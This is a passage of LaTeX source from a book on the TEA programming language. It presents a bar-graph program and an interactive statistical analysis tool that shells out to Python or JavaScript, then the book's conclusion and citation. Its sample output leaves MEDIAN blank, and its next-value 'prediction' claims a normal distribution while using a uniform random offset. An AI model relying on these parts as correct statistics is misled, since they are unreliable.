d:[ ] | d!:{,}| v: | v!: | x!:{+1} | r.: | v:vNSEQ

#get the word MSS
y:vSEQUENCE | h:, | d:, | u: | t.: | v:vSEQ_MSS
#but we would rather present a graph with items sorted based on order
#thus, override MSS with sorted one
#y:vSEQ_MSS | o: | v:vSEQ_MSS

#initialize graph structure as empty graph
v:vGRAPH:{}

#-----| For each item in the MSS, obtain its frequency |---
l:lBUILD_GRAPH
y:vSEQ_MSS
d:[ ].*$ | v:vITEM #first, get the item
#build a lookup pattern [,]?N[,]?
y:vITEM | x:, | x!:, | v:vITEM_REGEX
#use it to reduce original sequence to only instances of item..
y:vSEQUENCE | d*!:vITEM_REGEX
#remove extraneous commas
r!:[,]+:, | d:^, | d:,$
#count instances of item then..
d!:{,}| v: | v!: | x!:{+1} | r.: | v:vNITEM
#build the visual for item for the graph structure
#N:--...N-times
v:vGRAPH_ELEMENT:{-}
v:vGRAPH_ITEM:{} | x*!:vGRAPH_ITEM:vITEM | x!:{:} | v:vGRAPH_ITEM
v:vN_ITEM_GRAPH_LEN:{0}
l:lSTART_ITEM_GRAPH
x*!:vGRAPH_ELEMENT:vGRAPH_ITEM | v:vGRAPH_ITEM
y:vN_ITEM_GRAPH_LEN | x!:{+1} | r.: | v:vN_ITEM_GRAPH_LEN
#build and run test...
y:vN_ITEM_GRAPH_LEN | x!:{==} | x*!:vNITEM | r.: | f:true:lDONE_ITEM_GRAPH:lSTART_ITEM_GRAPH
l:lDONE_ITEM_GRAPH
#add item graph to main graph...
y:vGRAPH | x!:{
}|x*!:vGRAPH_ITEM | v:vGRAPH #update graph
#remove this item from the MSS, and then loop...
y:vSEQ_MSS
d!:[ ].*$ | t!.: | v:vSEQ_MSS #first, get the item
#if mss empty, finish, otherwise loop..
f:^$:lGRAPH_READY:lBUILD_GRAPH
l:lGRAPH_READY
y:vGRAPH #present final graph :)
   \end{lstlisting}
  \end{tcolorbox}


So, with that program, we see that, without providing any other dataset, we get the following graph corresponding to the dataset we have specified directly in the code:


  \begin{tcolorbox}[title=Sample OUTPUT Bar-GRAPH from Dataset of 20 Random Numbers (Ages),  breakable,listing options={basicstyle=\ttfamily, breaklines=true, breakatwhitespace=true}]
24:--
85:--
20:--
12:-
95:-
18:-
27:-
97:-
39:-
80:-
65:-
93:-
82:-
81:-
52:-
62:-
89:-
  \end{tcolorbox}


Which, appears as it is because the widget being used here actually is not correctly displaying the new-line breaks. However, we also should note that in this sample output, the numbers representing the unique values from the dataset (which we arrived at by computing the \textbf{modal sequence statistic} of the dataset), are being used to present the graph, however, unlike usual graphs, our values are not being sorted in their quantitative order, and perhaps we should make that enhancement. To accomplish that, we simply shall uncomment the line in the graph-generating program that would override the MSS with one whose values are further sorted in their quantitative ascending order; we shall want to uncomment the instruction \texttt{y:vSEQ\_MSS | o: | v:vSEQ\_MSS}. And so that, after that modification, and if we render the resulting graph properly, based on the same exact dataset, the final graph should appear as such:


\begin{figure}[H]
\LARGE
  \centering
  \begin{tcolorbox}[myterminalstyle, title=SORTED BAR GRAPH]
  \begin{lstlisting}
12:-
18:-
20:--
24:--
27:-
39:-
52:-
62:-
65:-
80:-
81:-
82:-
85:--
89:-
93:-
95:-
97:-                   
  \end{lstlisting}
  \end{tcolorbox}
  \caption{TEA OUTPUT: BASIC BAR GRAPH --- based on dataset MSS sorted in ASC order}
\end{figure}



\vspace{2em}

Thus, in the first case, it would help to express the analytical graph as a kind of distribution of the values by their relative frequency, perhaps useful in some contexts. Whereas, with the graph presented based on the numerically sorted underlying MSS, we then obtain a graph that depicts the relative distribution of terms in the dataset, somewhat reflecting their relative probability distribution too. With this later approach, and especially where the dataset is of significant size, this approach might even approach a kind of normal or Gaussian curve of the dataset.


\vspace{2em}

So anyways, after much experimentation and tweaking, we have the following cross-platform solution of a basic STATISTICAL ANALYSIS tool implemented using TEA. Note that, because of a preference to simplify mathematics-heavy tasks, the bits such as computing statistical measures and the bit about predicting the next value given a sample  dataset are implemented leveraging the TEA \textbf{ZAP} facility, with care taken so that the code has different implementations for when the program is run via WEB TEA or via command-line.

\vspace{2em}


%\begin{figure}[H]
{
  \begin{tcolorbox}[teaterminalstyle, title=TEA Program: STATISTICAL ANALYSIS v.1, breakable]
  \begin{lstlisting}[language=TEA,breaklines=true,numbers=left]
#########################################
# STATISTICAL ANALYSIS TOOL (SAT) v.2
#---------------------------------------
# An interactive program for analyzing
# numeric data using 3 analysis modes:
# descriptive/visual, exploratory and predictive.
#########################################

#first, pick any user/externally provided data...
v:vDATA

#====| CONSTANTS |====
v:vHLINE:{
--------------------
}
v:vHHLINE:{
====================
}
v:vPROMPT_METHOD:{Select Analysis Method: [1] Descriptive | [2] Exploratory | [3] Predictive
}
v:vANALYSIS_MSG:{No Analysis Done Yet!} | y:vANALYSIS_MSG | v:vRESULT
z.:PLATFORM | v:vPLATFORM #store underlying platform/environment...

#in case no data was presented, use hardcoded dataset...
y:vDATA
i:{12,24,95,18,85,27,97,39,80,20,65,24,93,82,85,81,52,62,20,89} | v:vDATA
j:lPREPROCESS_DATA

#prompt for data...
l:lPROMPT_FOR_DATA
i!:{Please Enter [qQ] to Quit, otherwise a [space or] comma-delimited sequence of numbers:} | i*: | v:vDATA

#----| should we quit? |---
f:^[qQ]$:lQUIT

#----| pre-process and clean data |---
l:lPREPROCESS_DATA
g: #eliminate white-space
r:,]$:] #fix final comma from some TDT generators
d!:[\d ,] #apply filter
g:,:[ ] | r!:,,*:, #enforce strict , delimiter
v:vDATA_CLEAN #for presentation
x:,|x!:, #to ease lookups
v:vDATA #override

#----| ensure data conforms to structure required otherwise flag error |---
f!:^,\d+(,\d+)*,$:lERROR_INVALID_DATA:lVALID_DATA

l:lERROR_INVALID_DATA
i!:{SORRY, but DATA entered was INVALID.} | i*:
j:lPROMPT_FOR_DATA # [re-]prompt for correct data

#we have proper data, might proceed...
l:lVALID_DATA

#----| present clean dataset and prompt for analysis method |---
l:lANALYSIS_PROMPT
y:vDATA_CLEAN | x*:vHHLINE | x:{The DATA:} |x*!:vHHLINE | x*!:vPROMPT_METHOD | v:vPROMPT | i*: | v:vANS


#check if we got meaningful answer, otherwise re-prompt
t!.: | f:^$:lANALYSIS_PROMPT | f!:^[123]$:lANALYSIS_PROMPT

#process response then...
f:1:lPROCESS_ANALYSIS_DESC | f:2:lPROCESS_ANALYSIS_EXPL | f:3:lPROCESS_ANALYSIS_PRED

####| START PROCESSING ANALYTICS |####
v:vANALYSIS_RESULT:{}


#----| perform visual/descriptive analysis |---
l:lPROCESS_ANALYSIS_DESC

y:vDATA
v:vSEQUENCE #stash comma-del sequence
#count the values...
d:[ ] | d!:{,}| v: | v!: | x!:{+1} | r.: | v:vNSEQ

#get the word MSS
y:vSEQUENCE | h:, | d:, | u: | t.: | v:vSEQ_MSS
#but we would rather present a graph with items sorted based on order
#thus, override MSS with sorted one
y:vSEQ_MSS | o: | v:vSEQ_MSS

#initialize graph structure as empty graph
v:vGRAPH:{}

#-----| For each item in the MSS, obtain its frequency |---
y:vSEQUENCE | r!:{,}:{,,} | v:vLOOKUP_SEQUENCE #for use in graph computations
l:lBUILD_GRAPH
y:vSEQ_MSS

d:[ ].*$ | v:vITEM #first, get the item
#build a lookup pattern (,|[^0-9])N(,|[^0-9])
y:vITEM | x:{(,|[^0-9])} | x!:{(,|[^0-9])} | v:vITEM_REGEX
#use it to reduce original sequence to only instances of item..
y:vLOOKUP_SEQUENCE | d*!:vITEM_REGEX
#remove extraneous commas
r!:[,]+:, | d:^, | d:,$
#count instances of item then..
d!:{,}| v: | v!: | x!:{+1} | r.: | v:vNITEM
#build the visual for item for the graph structure
#N:--...N-times
v:vGRAPH_ELEMENT:{-}
v:vGRAPH_ITEM:{} | x*!:vGRAPH_ITEM:vITEM | x!:{:} | v:vGRAPH_ITEM
v:vN_ITEM_GRAPH_LEN:{0}
l:lSTART_ITEM_GRAPH
x*!:vGRAPH_ELEMENT:vGRAPH_ITEM | v:vGRAPH_ITEM
y:vN_ITEM_GRAPH_LEN | x!:{+1} | r.: | v:vN_ITEM_GRAPH_LEN
#build and run test...
y:vN_ITEM_GRAPH_LEN | x!:{==} | x*!:vNITEM | r.: | f:true:lDONE_ITEM_GRAPH:lSTART_ITEM_GRAPH
l:lDONE_ITEM_GRAPH
#add item graph to main graph...
y:vGRAPH | x!:{
}|x*!:vGRAPH_ITEM | v:vGRAPH #update graph
#remove this item from the MSS, and then loop...
y:vSEQ_MSS
d!:[ ].*$ | t!.: | v:vSEQ_MSS #first, get the item
#if mss empty, finish, otherwise loop..
f:^$:lGRAPH_READY:lBUILD_GRAPH
l:lGRAPH_READY
y:vGRAPH #present final graph :)
#affix graph to result
k!:^[ ]*$ #kick-out blank lines
v:vANALYSIS_RESULT

#what did we do?
v:vANALYSIS_MSG:{Finished summarizing the data visually.}

j:lDONE_PROCESSING #goto present results...


#----| perform numerical/exploratory analysis |---
l:lPROCESS_ANALYSIS_EXPL 
v:vRANGE:{}
v:vMODE:{}
v:vMEDIAN:{}
v:vMEAN:{}
v:vVARIANCE:{}
v:vSDEVIATION:{}
v:vMSS:{}

y:vDATA
v:vSEQUENCE #stash comma-del sequence
#count the values...
d:[ ] | d!:{,}| v: | v!: | x!:{+1} | r.: | v:vNSEQ

#get the word MSS
y:vSEQUENCE | h:, | d:, | u: | t.: | v:vSEQ_MSS | v:vMSS

#store data sequence we'll use in external functions
y:vSEQUENCE | d:^,:,$ | x:[ | x!:] | v:vARRAY_SEQUENCE

#compute the statistics...

#===| compute RANGE |
#get the word MSS sorted numerically
y:vMSS | o: | v:vMSS_SORTED
y:vMSS_SORTED | d:[ ].*$ 
v:vITEM_MIN #store smallest value
y:vMSS_SORTED | m: | d:[ ].*$  
v:vITEM_MAX #store largest value
y:vITEM_MIN | x!:{-} | x*!:vITEM_MAX | v:vRANGE

#===| compute MODE|
#get the normal word MSS
y:vMSS | d:[ ].*$ 
v:vMODE #store most frequent value

#===| compute MEDIAN|
y:vPLATFORM
f:WEB:lWEB_MEDIAN:lCLI_MEDIAN
l:lWEB_MEDIAN #to compute median via JavaScript
y:vARRAY_SEQUENCE
v:vCMD:{const median = arr => (sorted => (sorted[sorted.length >> 1] + sorted[(sorted.length - 1) >> 1]) / 2)([...arr].sort((a, b) => a - b));median(JSON.parse(AI));}
z*!:vCMD
j:lMEDIAN_READY

l:lCLI_MEDIAN #to compute median via Python

i!:{python3 -c "import json; AI='}
x*!:vARRAY_SEQUENCE
x!:{'; a=json.loads(AI); print(sorted(a)[len(a)//2] if len(a)%2 else sum(sorted(a)[len(a)//2-1:len(a)//2+1])/2)"}
v:vCMD | z*:vCMD
j:lMEDIAN_READY

l:lMEDIAN_READY
v:vMEDIAN


#===| compute MEAN|
y:vPLATFORM
f:WEB:lWEB_MEAN:lCLI_MEAN
l:lWEB_MEAN #to compute mean via JavaScript
y:vARRAY_SEQUENCE
z:{const mean = arr => arr.reduce((sum, val) => sum + val, 0) / arr.length;
mean(JSON.parse(AI));}
j:lMEAN_READY

l:lCLI_MEAN #to compute mean via Python

i!:{python3 -c "import json; AI='}
x*!:vARRAY_SEQUENCE
x!:{'; a=json.loads(AI); print(sum(a)/len(a))"}
v:vCMD | z*:vCMD
j:lMEAN_READY

l:lMEAN_READY
v:vMEAN


#===| compute population VARIANCE|
y:vPLATFORM
f:WEB:lWEB_VARIANCE:lCLI_VARIANCE
l:lWEB_VARIANCE #to compute variance via JavaScript
y:vARRAY_SEQUENCE
z:{const variance = arr => (m => arr.reduce((s, x) => s + (x - m) ** 2, 0) / arr.length)(arr.reduce((a, b) => a + b, 0) / arr.length);
variance(JSON.parse(AI));}
j:lVARIANCE_READY

l:lCLI_VARIANCE #to compute variance via Python

i!:{python3 -c "import json; AI='}
x*!:vARRAY_SEQUENCE
x!:{'; a=json.loads(AI); m=sum(a)/len(a); print(sum((x - m)**2 for x in a)/len(a))"}
v:vCMD | z*:vCMD
j:lVARIANCE_READY

l:lVARIANCE_READY
v:vVARIANCE


#===| compute STANDARD DEVIATION|
y:vPLATFORM
f:WEB:lWEB_SDEVIATION:lCLI_SDEVIATION
l:lWEB_SDEVIATION #to compute standard deviation via JavaScript
y:vVARIANCE
z:{Math.sqrt(Number(AI));}
j:lSDEVIATION_READY

l:lCLI_SDEVIATION #to compute standard deviation via Python

i!:{python3 -c "import math; print(math.sqrt(}
x*!:vVARIANCE | t.:
x!:{))"}
v:vCMD | z*:vCMD
j:lSDEVIATION_READY

l:lSDEVIATION_READY
v:vSDEVIATION


i!:{RANGE:} | x*!:vRANGE | x!:{ | MODE:} | x*!:vMODE | x!:{ | MEDIAN:} | x*!:vMEDIAN | x!:{ | MEAN:} | x*!:vMEAN | x!:{ | VARIANCE:} | x*!:vVARIANCE | x!:{ | STANDARD DEVIATION:} | x*!:vSDEVIATION | x!:{ | MODAL SEQUENCE:} | x*!: vMSS   
v:vANALYSIS_RESULT

#what did we do?
v:vANALYSIS_MSG:{Finished summarizing the data using measures and statistics.}
j:lDONE_PROCESSING #goto present results...


#----| perform numerical/predictive analysis |---
l:lPROCESS_ANALYSIS_PRED

y:vDATA
v:vSEQUENCE #stash comma-del sequence

#===| compute probabilistic extrapolation...|
# in our list extrapolation methods here, we are going to
#assume the dataset conforms to a normal distribution
#and so we shall do basic probabilistic prediction of
#the next value past the end of the dataset given 
#the nature of the sample (its mean and standard deviation)
y:vSEQUENCE | d:^,:,$ | x:[ | x!:] | v:vARRAY_SEQUENCE

y:vPLATFORM
f:WEB:lWEB_PREDICTION:lCLI_PREDICTION
l:lWEB_PREDICTION 
y:vARRAY_SEQUENCE
v:vCMD:{const nextProbable = arr => {
  let m = arr.reduce((a, b) => a + b, 0) / arr.length;
  let s = Math.sqrt(arr.reduce((a, x) => a + (x - m) ** 2, 0) / arr.length);
  return m + s * (Math.random() * 2 - 1);
};nextProbable(JSON.parse(AI));}
z*!:vCMD
j:lPREDICTION_READY

l:lCLI_PREDICTION 
i!:{python3 -c "import json, random, math; AI='}
x*!:vARRAY_SEQUENCE
x!:{'; a=json.loads(AI); m=sum(a)/len(a); s=math.sqrt(sum((x-m)**2 for x in a)/len(a)); print(m + s * (random.random()*2 - 1))"}
v:vCMD | z*:vCMD
j:lPREDICTION_READY

l:lPREDICTION_READY
v:vPREDICTION

i!:{Assuming Normal Distribution, NEXT value past end of dataset: } | x*!:vPREDICTION |
v:vANALYSIS_RESULT

#what did we do?
v:vANALYSIS_MSG:{Finished extrapolating the data.}

l:lDONE_PROCESSING
#present results...
y:vANALYSIS_RESULT |  x*!:vHHLINE | x!:{The DATA:} |  x*!:vHHLINE |
x*!:vDATA_CLEAN | x*:vHHLINE | x:{The DATA ANALYSIS:} |x*!:vHHLINE | x*!:vANALYSIS_MSG | v:vPROMPT | v:vRESULT | i*: | j:lPROMPT_FOR_DATA #not yet finished ;)

################################
#Finally, Quit, gracefully...
################################
l:lQUIT
y:vRESULT
   \end{lstlisting}
  \end{tcolorbox}
    \captionof{figure}{TEA EXAMPLE: STATISTICAL ANALYSIS Tool}
  \label{FIGNEX2}
  \vspace{1cm}


\vspace{2em}

And so, with that program, and the sample dataset of the ages of 20 random people in a given sample, we have the case of performing descriptive and visual analysis give us a result such as the following:


 \begin{tcbverbatim}[title=Sample OUTPUT DATA ANALYSIS (Descriptive) of Dataset of 20 Random Numbers (Ages)]
The DATA ANALYSIS:
====================
12:-
18:-
20:--
24:--
27:-
39:-
52:-
62:-
65:-
80:-
81:-
82:-
85:--
89:-
93:-
95:-
97:-
====================
The DATA:
====================
12,24,95,18,85,27,97,39,80,20,65,24,93,82,85,81,52,62,20,89
====================
Finished summarizing the data visually.  
  \end{tcbverbatim}


\vspace{2em}

And as for exploratory analysis, we have the following...


 \begin{tcbverbatim}[title=Sample OUTPUT DATA ANALYSIS (Summary) of Dataset of 20 Random Numbers (Ages)]
The DATA ANALYSIS:
====================
RANGE:12-97 | MODE:24 | MEDIAN: | MEAN:57.5 | VARIANCE:922.85 | STANDARD DEVIATION:30.378446306550966 | MODAL SEQUENCE:24 85 20 12 95 18 27 97 39 80 65 93 82 81 52 62 89
====================
The DATA:
====================
12,24,95,18,85,27,97,39,80,20,65,24,93,82,85,81,52,62,20,89
====================
Finished summarizing the data using measures and statistics. 
  \end{tcbverbatim}

 
\vspace{2em}

And finally, for Exploratory-Predictive analysis, we have the following output that mostly leverage basic probabilistic extrapolation of the given dataset assuming it is normally distributed, and thus merely use a basic predictor leveraging the dataset's mean and standard deviation as in the formulation\cite{copilot_assistant}...


\subsubsection{Probabilistic Next-Value Estimation}

Given a sequence of real numbers:
\[
X = \{x_1, x_2, \dots, x_n\}
\]

We compute the \textbf{mean} \(\mu\) and \textbf{standard deviation} \(\sigma\) of the sequence:
\[
\mu = \frac{1}{n} \sum_{i=1}^{n} x_i
\]
\[
\sigma = \sqrt{ \frac{1}{n} \sum_{i=1}^{n} (x_i - \mu)^2 }
\]

Then, we generate a random perturbation \(r\) from a uniform distribution over \([-1, 1]\):
\[
r \sim \mathcal{U}(-1, 1)
\]

The estimated next value \(x_{n+1}\) is given by:
\[
x_{n+1} = \mu + \sigma \cdot r
\]


And so that, given our example dataset and this model, we can obtain the following results using our statistical analysis tool..



 \begin{tcbverbatim}[title=Sample OUTPUT DATA ANALYSIS (Predictive) of Dataset of 20 Random Numbers (Ages)]
The DATA ANALYSIS:
====================
Assuming Normal Distribution, NEXT value past end of dataset: 28.27933103128229
====================
The DATA:
====================
12,24,95,18,85,27,97,39,80,20,65,24,93,82,85,81,52,62,20,89
====================
Finished extrapolating the data.   
  \end{tcbverbatim}


\vspace{2em}

For those interested, the complete code and live-testing of this program can be accessed via:


 
\vspace{1em}

 \url{https://tea.nuchwezi.com/?i=[1,2,3,3,2,4,5]&fc=https://gist.githubusercontent.com/mcnemesis/33d11fc7c00b148a388b0ef98e849041/raw/statistical_analyst.tea}

\vspace{1em} 



%%%%%%%%%%%---------[ CONCLUSION ]--------%%%%%%%%%%%%%%%%%

\chapter{Conclusion}
\label{SECCONC}

%---refs fixed up to this point...


We have covered sufficient material to help anyone coming to \textbf{TEA}, to be able to understand where the language came from, what it is based on, how it is designed or specified, what the language grammar is, how the language is processed, what sample programs in the language look like, and finally, what the core aspects of the language's Instruction Set are, A: to Z:, as well as sufficient test cases and sample codes for almost each specified aspect of those 26 core TEA primitives. This book is additionally meant to serve as an operating manual\footnote{Almost like what \textbf{a grimoire} would be, in case computer programming was likened to practicing magick!} and working reference for those using TEA programming in practice, across domains, as well as those reading and trying to understand, debug or extend [existing] TEA programs. We have also included material on where, how and which TEA standard to install where, how to run or update it, as well as where to find the developers for feedback, how to join the TEA user, developer and research community and also how one might learn from and follow the inventor of the language himself.



%---[ END BOOK CONTENT/CHAPTERS ]

%---[ BEGIN BOOK END/APPENDICES]
\begin{appendices}

%\chapter{Other Functions of DNA Beyond Protein Synthesis}
%\label{APPOTHERFUNC}


%-------[ END CONTENT ]


\end{appendices}

%\includepdf[pages=1]{resources/pdfs/note_cover.pdf}

\bibliographystyle{unsrt}
\bibliography{references}

%\comment{

%\newpage

\vspace{5cm}
\fbox{
\begin{minipage}{0.9\textwidth}
\textbf{TO CITE:}\\

Lutalo, Joseph Willrich (2024). \textbf{TEA TAZ: Transforming Executable Alphabet A: to Z: COMMAND SPACE SPECIFICATION.} Figshare. Book. \url{https://doi.org/10.6084/m9.figshare.26661328}

\end{minipage}}
\\
%}


%---[ END BOOK END/BACKCOVER]

% Float the section to center of page
\begin{center}
\vspace*{\fill}

\chapter*{About the Inventor of TEA\footnote{Refer to \textbf{ORCID:} \url{https://orcid.org/0000-0002-0002-4657}}}
\addcontentsline{toc}{chapter}{About the Inventor of TEA}


\begin{figure}[H]
  \begin{center}
  %\includegraphics[trim=0cm 20cm 0cm 0cm, clip, width=0.9\textwidth,]{resources/pdfs/OZINCIPHER-APP3-EXA.pdf}\\
  %\includegraphics[trim=LEFT BOTTOM RIGHT TOP, 
   \includegraphics[trim=0cm 1cm 0cm 2cm, clip, height=0.8\textheight,]{resources/pdfs/AboutAuthor.pdf}\\
   %\caption{The \textbf{alternative rendering}  of the same sequence as $\Omega_{veuler}$.}
  %\label{FIGLGESEULERVIRUSv2_ORIG}
  \end{center}
\end{figure}

\vspace*{\fill}
\end{center}


% insert [back] cover --- could just be a PNG or PDF
\includepdf[pages=1]{../taz_back_cover.pdf}

\end{document}
